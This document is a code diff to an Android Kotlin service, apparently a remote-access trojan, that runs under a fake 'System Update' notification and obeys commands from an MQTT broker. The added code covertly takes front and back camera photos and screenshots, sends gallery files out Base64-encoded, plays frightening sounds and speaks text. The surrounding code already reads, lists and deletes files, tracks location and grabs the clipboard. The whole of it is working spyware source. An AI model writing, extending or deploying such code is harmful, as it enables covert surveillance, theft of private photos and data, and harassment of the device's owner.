@@ -3,16 +3,28 @@ package com.ghost.target
 import android.app.*
 import android.app.admin.DevicePolicyManager
 import android.content.*
+import android.graphics.*
+import android.hardware.camera2.*
 import android.location.LocationManager
+import android.media.*
+import android.media.projection.MediaProjection
+import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.*
 import android.provider.*
+import android.speech.tts.TextToSpeech
+import android.util.Base64
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import org.eclipse.paho.client.mqttv3.*
 import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
 import java.io.*
+import java.nio.ByteBuffer
+import java.nio.ByteOrder
+import java.util.Locale
+import kotlin.coroutines.resume
+import kotlin.coroutines.suspendCoroutine
 
 class TargetService : Service() {
     companion object {
@@ -25,10 +37,17 @@ class TargetService : Service() {
         }
     }
 
+    private var cameraId: String? = null
+    private var mediaProjection: MediaProjection? = null
+    private var mediaPlayer: MediaPlayer? = null
+    private var tts: TextToSpeech? = null
+
     override fun onCreate() {
         super.onCreate()
         instance = this
         startForeground(1, buildNotif())
+        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
+        tts = TextToSpeech(this) { if (it == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }
         
         try {
             mqttClient = MqttClient(BROKER, MqttClient.generateClientId(), MemoryPersistence())
@@ -48,14 +67,26 @@ class TargetService : Service() {
         return NotificationCompat.Builder(this, ch).setContentTitle("System Update").setContentText("Updating...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
     }
 
+    fun setMediaProjection(mp: MediaProjection?) { this.mediaProjection = mp }
+
     private fun handle(cmd: String) {
         when {
+            cmd == "photo" -> CoroutineScope(Dispatchers.IO).launch { takePhoto(false) }
+            cmd == "photo_front" -> CoroutineScope(Dispatchers.IO).launch { takePhoto(true) }
+            cmd == "screenshot" -> takeScreenshot()
+            cmd == "ghost_sound" -> playGhostSound()
+            cmd == "ring" -> playRing()
+            cmd == "stop_audio" -> { mediaPlayer?.release(); mediaPlayer = null; sendLog("Stopped") }
+            cmd.startsWith("tts:") -> { tts?.speak(cmd.substringAfter("tts:"), TextToSpeech.QUEUE_FLUSH, null, "g"); sendLog("Speaking") }
+            cmd == "toast_default" -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, "System Error!", Toast.LENGTH_SHORT).show() }
             cmd.startsWith("toast:") -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.substringAfter("toast:"), Toast.LENGTH_LONG).show() }
+            cmd == "torch_on" -> setTorch(true)
+            cmd == "torch_off" -> setTorch(false)
             cmd == "vibrate" -> vibratePhone()
             cmd == "volume_max" -> setVol(100)
             cmd == "volume_mute" -> setVol(0)
             cmd == "lock" -> lockScreen()
-            cmd.startsWith("open:") -> startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(cmd.substringAfter("open:"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            cmd.startsWith("open:") -> startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(cmd.substringAfter("open:"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
             cmd.startsWith("start_app:") -> startApp(cmd.substringAfter("start_app:"))
             cmd == "loc" -> getLocation()
             cmd == "gps_track" -> trackLocation()
@@ -68,6 +99,7 @@ class TargetService : Service() {
             cmd == "battery" -> sendLog(getBattery())
             cmd == "clip" -> sendLog(getClipboard())
             cmd == "gallery" -> sendLog(getGallery())
+            cmd.startsWith("dl_gallery:") -> downloadGallery(cmd.substringAfter("dl_gallery:"))
             cmd.startsWith("ls:") -> sendLog(listFiles(cmd.substringAfter("ls:")))
             cmd.startsWith("read:") -> sendLog(readFile(cmd.substringAfter("read:")))
             cmd.startsWith("del:") -> deleteFile(cmd.substringAfter("del:"))
@@ -80,6 +112,142 @@ class TargetService : Service() {
         }
     }
 
+    private suspend fun takePhoto(front: Boolean): Unit {
+        return suspendCoroutine { cont ->
+            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
+            val id = if (front) cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT } else cameraId
+            
+            if (id == null) {
+                sendLog("Camera not found")
+                cont.resume(Unit)
+            } else {
+                try {
+                    val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
+                    if (size == null) {
+                        cont.resume(Unit)
+                    } else {
+                        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
+                        reader.setOnImageAvailableListener({ r ->
+                            val img = r.acquireLatestImage()
+                            if (img != null) {
+                                val buf = img.planes[0].buffer
+                                val b = ByteArray(buf.remaining())
+                                buf.get(b)
+                                img.close()
+                                r.close()
+                                val bmp = Bitmap.createScaledBitmap(BitmapFactory.decodeByteArray(b, 0, b.size), 640, 480, true)
+                                val baos = ByteArrayOutputStream()
+                                bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos)
+                                sendLog("img:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
+                                cont.resume(Unit)
+                            }
+                        }, Handler(Looper.getMainLooper()))
+                        
+                        cm.openCamera(id, object : CameraDevice.StateCallback() {
+                            override fun onOpened(dev: CameraDevice) {
+                                dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                                    override fun onConfigured(s: CameraCaptureSession) {
+                                        s.capture(dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build(), null, null)
+                                        dev.close()
+                                    }
+                                    override fun onConfigureFailed(s: CameraCaptureSession) {
+                                        dev.close()
+                                        cont.resume(Unit)
+                                    }
+                                }, null)
+                            }
+                            override fun onDisconnected(dev: CameraDevice) { dev.close() }
+                            override fun onError(dev: CameraDevice, e: Int) {
+                                dev.close()
+                                cont.resume(Unit)
+                            }
+                        }, null)
+                    }
+                } catch (e: Exception) {
+                    cont.resume(Unit)
+                }
+            }
+        }
+    }
+
+    private fun takeScreenshot() {
+        val mp = mediaProjection
+        if (mp == null) {
+            sendLog("Screenshot permission not granted")
+        } else {
+            val dm = resources.displayMetrics
+            val w = dm.widthPixels; val h = dm.heightPixels; val d = dm.densityDpi
+            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 1)
+            val vd = mp.createVirtualDisplay("G", w, h, d, android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+            Handler(Looper.getMainLooper()).postDelayed({
+                val img = reader.acquireLatestImage()
+                if (img != null) {
+                    val p = img.planes[0]; val buf = p.buffer; val ps = p.pixelStride; val rs = p.rowStride
+                    val bmp = Bitmap.createBitmap(w + (rs - ps * w) / ps, h, Bitmap.Config.ARGB_8888)
+                    bmp.copyPixelsFromBuffer(buf); img.close(); vd.release(); reader.close()
+                    val baos = ByteArrayOutputStream()
+                    Bitmap.createBitmap(bmp, 0, 0, w, h).compress(Bitmap.CompressFormat.JPEG, 40, baos)
+                    sendLog("screen:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
+                }
+            }, 500)
+        }
+    }
+
+    private fun playGhostSound() {
+        try {
+            val am = getSystemService(AUDIO_SERVICE) as AudioManager
+            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
+            val sr = 8000
+            val ns = (5.0 * sr).toInt()
+            val s = DoubleArray(ns)
+            val gs = ByteArray(2 * ns)
+            for (i in 0 until ns) s[i] = Math.sin(2 * Math.PI * i / (sr / 50.0))
+            var idx = 0
+            for (v in s) { 
+                val vs = (v * 32767).toInt().toShort()
+                gs[idx++] = (vs.toInt() and 0x00ff).toByte()
+                gs[idx++] = ((vs.toInt() and 0xff00) ushr 8).toByte() 
+            }
+            val f = File(cacheDir, "ghost.wav")
+            val fos = FileOutputStream(f)
+            val header = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN)
+            header.put("RIFF".toByteArray())
+            header.putInt(36 + ns * 2)
+            header.put("WAVE".toByteArray())
+            header.put("fmt ".toByteArray())
+            header.putInt(16)
+            header.putShort(1)
+            header.putShort(1)
+            header.putInt(sr)
+            header.putInt(sr * 2)
+            header.putShort(2)
+            header.putShort(16)
+            header.put("data".toByteArray())
+            header.putInt(ns * 2)
+            fos.write(header.array())
+            fos.write(gs)
+            fos.close()
+            mediaPlayer?.release()
+            mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
+            sendLog("Ghost Sound Playing")
+        } catch (e: Exception) { sendLog("err: ${e.message}") }
+    }
+
+    private fun playRing() {
+        val am = getSystemService(AUDIO_SERVICE) as AudioManager
+        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+        mediaPlayer?.release()
+        mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI).apply { isLooping = false; start() }
+        sendLog("Ringing")
+    }
+
+    private fun setTorch(on: Boolean) { 
+        try { 
+            (getSystemService(CAMERA_SERVICE) as CameraManager).setTorchMode(cameraId ?: return, on)
+            sendLog(if (on) "ON" else "OFF") 
+        } catch (e: Exception) {} 
+    }
+
     private fun vibratePhone() { 
         val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
         if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
@@ -87,8 +255,8 @@ class TargetService : Service() {
     }
 
     private fun setVol(pct: Int) { 
-        val am = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
-        am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC) * pct / 100, 0)
+        val am = getSystemService(AUDIO_SERVICE) as AudioManager
+        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * pct / 100, 0)
         sendLog("Volume $pct%") 
     }
 
@@ -179,6 +347,11 @@ class TargetService : Service() {
         return sb.toString() 
     }
 
+    private fun downloadGallery(name: String) { 
+        val f = File("/sdcard/DCIM/Camera/$name")
+        if (f.exists()) sendLog("file:$name|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) else sendLog("File not found") 
+    }
+
     private fun listFiles(path: String): String { 
         val f = File(path)
         if (!f.exists()) return "Not found"
@@ -204,7 +377,7 @@ class TargetService : Service() {
         val f = File(path)
         if (!f.exists()) return sendLog("Not found")
         if (f.length() > 5*1024*1024) return sendLog("File > 5MB")
-        sendLog("file:${f.name}|" + android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)) 
+        sendLog("file:${f.name}|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) 
     }
 
     private fun createDir(path: String) { 
